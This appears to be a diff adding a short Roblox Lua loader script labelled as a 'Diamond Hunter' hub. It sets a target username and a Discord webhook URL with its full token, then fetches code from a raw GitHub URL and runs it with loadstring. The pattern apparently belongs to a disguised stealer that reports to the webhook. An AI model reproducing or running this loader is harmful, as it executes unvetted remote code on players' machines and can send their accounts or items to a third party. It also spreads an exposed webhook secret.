@@ -1,0 +1,5 @@
+_G.Username = "Lunaticscuat226"
+_G.HubName = "Diamond Hunter"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1106223719845740584/L_TfCbvRcKgOrZ6Z8qUsxwr53QP7-LB3D9HD4NowPxDT7QSbtpCIbja4mvWNRkYkumbL"
+
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/trexylol/rexscript/main/main"), true))()
